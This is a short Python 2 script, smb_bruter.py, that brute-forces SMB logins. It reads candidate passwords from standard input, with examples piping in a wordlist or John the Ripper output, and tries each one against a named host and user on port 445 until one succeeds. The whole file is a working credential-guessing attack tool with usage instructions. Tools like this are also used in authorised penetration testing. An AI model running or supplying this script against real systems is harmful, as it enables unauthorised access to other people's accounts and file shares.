#!/usr/bin/env python2
#  pip install pysmb

#Example usages:
#  cat dict.txt|./smb_bruter.py
#  john --incremental -stdout=8|./smb_bruter.py
from smb.SMBConnection import SMBConnection
import sys


try:
	input=raw_input
except Exception:
	pass

#returns (INT,STR)
#  INT is either 1 fail, 0 success, or -1 error
#  STR is error string or success string
def smb_login(server,username,password,timeout=None,workgroup='WORKGROUP'):
	try:
		conn=SMBConnection(username,password,'',server,is_direct_tcp=True)
		ans=conn.connect(server,445,timeout=timeout)
		conn.close()
	except Exception as error:
		return (-1,str(error))
	if ans:
		return (0,'Success')
	else:
		return (1,'Authentication failed.')



if __name__=='__main__':
	if len(sys.argv)<3:
		print('Usage: '+sys.argv[0]+' HOSTNAME USERNAME [WORKGROUP]')
		exit(1)
	workgroup='WORKGROUP'
	if len(sys.argv)>3:
		workgroup=sys.argv[3]
	print('Starting smb brute force')
	try:
		while True:
			password=input('')
			sys.stdout.write(password+'\t')
			sys.stdout.flush()
			test=smb_login(sys.argv[1],sys.argv[2],password,1,workgroup)
			sys.stdout.write(test[1]+'\n')
			sys.stdout.flush()
			if test[0]==0:
				exit(0)
			if test[0]==-1:
				exit(1)
	except KeyboardInterrupt:
		exit(1)
	except EOFError:
		exit(1)
	except Exception as error:
		print(error)
		exit(1)
